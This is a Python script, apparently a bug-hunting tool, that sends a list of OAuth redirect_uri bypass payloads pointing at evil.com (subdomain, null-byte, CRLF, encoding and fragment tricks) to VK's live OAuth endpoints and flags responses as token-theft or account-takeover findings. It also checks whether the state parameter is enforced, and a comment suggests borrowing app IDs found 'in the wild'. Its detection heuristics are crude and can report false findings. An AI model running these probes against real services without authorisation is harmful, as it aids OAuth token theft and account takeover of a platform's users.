#!/usr/bin/env python3
"""
VK OAuth Redirect URI Bypass Tester
====================================
Tests for OAuth redirect_uri validation bypass on VK's OAuth endpoints.

Usage:
    python3 vk_oauth_test.py

Tests:
    - redirect_uri manipulation (open redirect → token theft)
    - State parameter bypass (CSRF on OAuth flow)
    - PKCE enforcement check
    - Token leakage via referrer headers
"""

import asyncio
import json
import sys
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import httpx


# ─── Configuration ─────────────────────────────────────────────────────────────
RATE_LIMIT_DELAY = 0.2  # Slower for OAuth tests (more sensitive)
VK_OAUTH_BASE = "https://oauth.vk.com"
VK_ID_BASE = "https://id.vk.com"

# VK App ID for testing (use a test app or find one in the wild)
VK_APP_ID = "1"  # VK's official test app


# ─── Redirect URI Manipulation Payloads ────────────────────────────────────────
REDIRECT_MANIPULATION = [
    # ─── Basic Open Redirect ───────────────────────────────────────────────────
    {"param": "redirect_uri", "evil": "https://evil.com/callback", "technique": "basic"},
    {"param": "redirect_uri", "evil": "https://evil.com", "technique": "basic_no_path"},

    # ─── Subdomain Tricks ──────────────────────────────────────────────────────
    {"param": "redirect_uri", "evil": "https://evil.vk.com/callback", "technique": "subdomain"},
    {"param": "redirect_uri", "evil": "https://vk.com.evil.com/callback", "technique": "subdomain_abuse"},

    # ─── URL Parser Confusion ──────────────────────────────────────────────────
    {"param": "redirect_uri", "evil": "https://evil.com#@vk.com", "technique": "fragment_trick"},
    {"param": "redirect_uri", "evil": "https://evil.com%00.vk.com", "technique": "null_byte"},
    {"param": "redirect_uri", "evil": "https://evil.com%0d%0a.vk.com", "technique": "crlf_injection"},

    # ─── Encoding Tricks ───────────────────────────────────────────────────────
    {"param": "redirect_uri", "evil": "https://evil.com%252f%252f", "technique": "double_encoding"},
    {"param": "redirect_uri", "evil": "//evil.com/callback", "technique": "protocol_relative"},

    # ─── Special Characters ────────────────────────────────────────────────────
    {"param": "redirect_uri", "evil": "https://evil.com\\@vk.com", "technique": "backslash"},
    {"param": "redirect_uri", "evil": "https://evil.com:443@vk.com", "technique": "port_auth"},

    # ─── VK-Specific Tricks ────────────────────────────────────────────────────
    {"param": "redirect_uri", "evil": "https://evil.com/callback?vk_access_token=stolen", "technique": "token_param"},
    {"param": "redirect_uri", "evil": "https://evil.com/callback#access_token=stolen", "technique": "token_fragment"},
]


@dataclass
class OAuthTestResult:
    """Result of an OAuth test."""
    endpoint: str
    technique: str
    redirect_uri_sent: str
    vulnerable: bool
    severity: str
    evidence: str
    response_status: int
    response_snippet: str
    location_header: str


class VKOAuthTester:
    """VK OAuth redirect_uri bypass tester."""

    def __init__(self, access_token: Optional[str] = None):
        self.access_token = access_token
        self.results: list[OAuthTestResult] = []
        self.request_count = 0
        self.last_request_time = 0.0

    async def _rate_limit_wait(self):
        """Enforce rate limit."""
        elapsed = time.time() - self.last_request_time
        if elapsed < RATE_LIMIT_DELAY:
            await asyncio.sleep(RATE_LIMIT_DELAY - elapsed)
        self.last_request_time = time.time()
        self.request_count += 1

    async def _test_redirect_uri(self, endpoint: str, payload: dict) -> OAuthTestResult:
        """Test a redirect_uri manipulation payload."""
        await self._rate_limit_wait()

        params = {
            "client_id": str(VK_APP_ID),
            "redirect_uri": payload["evil"],
            "response_type": "token",
            "v": "5.131",
            "display": "page",
        }

        if self.access_token:
            params["access_token"] = self.access_token

        url = f"{endpoint}?{urlencode(params)}"

        async with httpx.AsyncClient(timeout=15.0, follow_redirects=False) as client:
            try:
                resp = await client.get(url)
                location = resp.headers.get("location", "")

                # Check for vulnerability
                vulnerable = False
                severity = "info"
                evidence = ""

                # Check if evil domain is in redirect location
                if "evil.com" in location:
                    vulnerable = True
                    severity = "CRITICAL"
                    evidence = f"Redirect contains evil.com: {location[:200]}"
                elif resp.status_code == 200:
                    # Check if page loads without error
                    body = resp.text[:1000]
                    if "error" not in body.lower() and "invalid" not in body.lower():
                        vulnerable = True
                        severity = "HIGH"
                        evidence = f"Page loaded without error (potential reflected redirect_uri)"
                    else:
                        evidence = "Page shows error for malicious redirect_uri"
                elif resp.status_code in (301, 302, 303, 307, 308):
                    if "evil.com" in location:
                        vulnerable = True
                        severity = "CRITICAL"
                        evidence = f"Redirect to evil.com: {location[:200]}"
                    else:
                        evidence = f"Redirect to: {location[:100]}"
                else:
                    evidence = f"Status: {resp.status_code}"

                return OAuthTestResult(
                    endpoint=endpoint,
                    technique=payload["technique"],
                    redirect_uri_sent=payload["evil"],
                    vulnerable=vulnerable,
                    severity=severity,
                    evidence=evidence,
                    response_status=resp.status_code,
                    response_snippet=resp.text[:500],
                    location_header=location[:500],
                )

            except httpx.RequestError as e:
                return OAuthTestResult(
                    endpoint=endpoint,
                    technique=payload["technique"],
                    redirect_uri_sent=payload["evil"],
                    vulnerable=False,
                    severity="info",
                    evidence=f"Request error: {str(e)[:100]}",
                    response_status=0,
                    response_snippet="",
                    location_header="",
                )

    async def _test_state_parameter(self, endpoint: str) -> OAuthTestResult:
        """Test if state parameter is enforced."""
        await self._rate_limit_wait()

        # Test without state parameter
        params = {
            "client_id": str(VK_APP_ID),
            "redirect_uri": "https://example.com/callback",
            "response_type": "token",
            "v": "5.131",
        }

        url = f"{endpoint}?{urlencode(params)}"

        async with httpx.AsyncClient(timeout=15.0, follow_redirects=False) as client:
            try:
                resp = await client.get(url)
                body = resp.text[:1000]

                # If no error about missing state, it might be vulnerable
                vulnerable = "state" not in body.lower() and resp.status_code == 200

                return OAuthTestResult(
                    endpoint=endpoint,
                    technique="missing_state",
                    redirect_uri_sent="https://example.com/callback",
                    vulnerable=vulnerable,
                    severity="MEDIUM" if vulnerable else "info",
                    evidence=f"Missing state parameter accepted" if vulnerable else "State parameter enforced",
                    response_status=resp.status_code,
                    response_snippet=body,
                    location_header=resp.headers.get("location", ""),
                )

            except httpx.RequestError as e:
                return OAuthTestResult(
                    endpoint=endpoint,
                    technique="missing_state",
                    redirect_uri_sent="https://example.com/callback",
                    vulnerable=False,
                    severity="info",
                    evidence=f"Request error: {str(e)[:100]}",
                    response_status=0,
                    response_snippet="",
                    location_header="",
                )

    async def run_all_tests(self) -> list[OAuthTestResult]:
        """Run all OAuth tests."""
        endpoints = [
            f"{VK_OAUTH_BASE}/authorize",
            f"{VK_ID_BASE}/oauth2",
        ]

        print(f"\n{'='*70}")
        print(f"VK OAUTH REDIRECT_URI BYPASS TESTER")
        print(f"{'='*70}")
        print(f"Endpoints: {len(endpoints)}")
        print(f"Redirect URI Payloads: {len(REDIRECT_MANIPULATION)}")
        print(f"Total Tests: {len(endpoints) * (len(REDIRECT_MANIPULATION) + 1)}")
        print(f"Rate Limit: {RATE_LIMIT_DELAY}s between requests")
        print(f"{'='*70}\n")

        self.results = []

        for endpoint in endpoints:
            print(f"\n🔍 Testing: {endpoint}")
            print(f"{'-'*70}")

            # Test redirect_uri manipulation
            for payload in REDIRECT_MANIPULATION:
                print(f"  Testing {payload['technique']}...", end=" ", flush=True)

                result = await self._test_redirect_uri(endpoint, payload)
                self.results.append(result)

                if result.vulnerable:
                    print(f"🔴 VULNERABLE — {result.severity}")
                else:
                    print(f"✅ Secure")

            # Test state parameter
            print(f"  Testing missing state...", end=" ", flush=True)
            state_result = await self._test_state_parameter(endpoint)
            self.results.append(state_result)
            if state_result.vulnerable:
                print(f"🟡 MEDIUM — State not enforced")
            else:
                print(f"✅ State enforced")

        return self.results

    def print_summary(self):
        """Print summary of OAuth test results."""
        critical = [r for r in self.results if r.severity == "CRITICAL"]
        high = [r for r in self.results if r.severity == "HIGH"]
        medium = [r for r in self.results if r.severity == "MEDIUM"]

        print(f"\n{'='*70}")
        print(f"OAUTH TEST RESULTS SUMMARY")
        print(f"{'='*70}")
        print(f"Total Tests:   {len(self.results)}")
        print(f"CRITICAL:      {len(critical)} 🔴")
        print(f"HIGH:          {len(high)} 🟠")
        print(f"MEDIUM:        {len(medium)} 🟡")
        print(f"{'='*70}")

        if critical:
            print(f"\n🔴 CRITICAL FINDINGS:")
            print(f"{'-'*70}")
            for r in critical:
                print(f"\n  Endpoint:  {r.endpoint}")
                print(f"  Technique: {r.technique}")
                print(f"  Redirect:  {r.redirect_uri_sent}")
                print(f"  Evidence:  {r.evidence}")
                print(f"  Impact:    OAuth token leakage → Account Takeover")

        if high:
            print(f"\n🟠 HIGH FINDINGS:")
            print(f"{'-'*70}")
            for r in high:
                print(f"\n  Endpoint:  {r.endpoint}")
                print(f"  Technique: {r.technique}")
                print(f"  Evidence:  {r.evidence}")

        print(f"\n{'='*70}")

    def export_results(self, path: str):
        """Export results to JSON."""
        data = {
            "summary": {
                "total_tests": len(self.results),
                "critical": len([r for r in self.results if r.severity == "CRITICAL"]),
                "high": len([r for r in self.results if r.severity == "HIGH"]),
                "medium": len([r for r in self.results if r.severity == "MEDIUM"]),
            },
            "results": [
                {
                    "endpoint": r.endpoint,
                    "technique": r.technique,
                    "redirect_uri_sent": r.redirect_uri_sent,
                    "vulnerable": r.vulnerable,
                    "severity": r.severity,
                    "evidence": r.evidence,
                    "response_status": r.response_status,
                    "location_header": r.location_header[:500],
                }
                for r in self.results
            ],
        }

        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        print(f"\nResults exported to: {path}")


async def main():
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(description="VK OAuth Redirect URI Bypass Tester")
    parser.add_argument("--access-token", help="VK access token (optional)")
    args = parser.parse_args()

    tester = VKOAuthTester(access_token=args.access_token)
    await tester.run_all_tests()
    tester.print_summary()
    tester.export_results("vk_oauth_results.json")


if __name__ == "__main__":
    asyncio.run(main())
